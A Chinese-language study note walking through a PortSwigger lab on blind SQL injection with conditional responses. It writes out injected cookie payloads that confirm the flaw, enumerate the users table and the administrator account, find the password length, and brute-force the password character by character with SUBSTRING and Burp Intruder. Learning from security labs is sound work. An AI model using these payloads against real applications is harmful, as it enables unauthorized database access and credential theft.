# SQL 注入

## SQL 注入备忘单

https://portswigger.net/web-security/sql-injection/cheat-sheet

## 例子一

参考 Lab: Blind SQL injection with conditional responses

1. 分析，可能用了某个SQL，例如 select tracking_id from tracking_table where tracking_id = 'KXXcpjgSUpgoXIRl';
2. 修改TrackingId select tracking_id from tracking_table where tracking_id = 'KXXcpjgSUpgoXIRl'--'; 返回结果一样，存在注入漏洞，如果结果是其他，那么可能不存在注入漏洞
3. select tracking_id from tracking_table where tracking_id = 'KXXcpjgSUpgoXIRl' and 1=1--'; 结果一样，存在注入漏洞，1=1改成1=2，结果不一样，结果为False
4. select tracking_id from tracking_table where tracking_id = 'KXXcpjgSUpgoXIRl' and (select 'x' from users limit 1) = 'x'--'; 猜是否有users表
5. select tracking_id from tracking_table where tracking_id = 'KXXcpjgSUpgoXIRl' and (select username from users where username = 'administrator 'limit 1) = 'administrator'--'; 猜是否有administrator用户，以及username列
6. 使用intruder 确定密码长度select tracking_id from tracking_table where tracking_id = 'KXXcpjgSUpgoXIRl' and (select username from users where username = 'administrator'  and length(password) > 1 limit 1) = 'administrator'--'; 试 1 2 3 4 5 ... 直到某个标识没出现，例如20的时候没出现，那么20就是密码长度
7. 确定密码长度20，Cookie: TrackingId=412sXaPzxUS4w84c' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a; session=WKKbcio4oJYlf72nueUvdRzxWcW58jY3 使用substring确认每一位密码的字符，a-zA-Z0-9，使用cluster bomb来实现' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$ 第一个用Numbers 第二个用Brute Forcer
8. 结果过滤 welcome back，记录每位密码的字符，拼接在一起
9. 密码为cckmlqxov888xrzgys01 （再复杂的密码也能被攻破，所以时刻使用SQL预处理防SQL注入，这很重要）
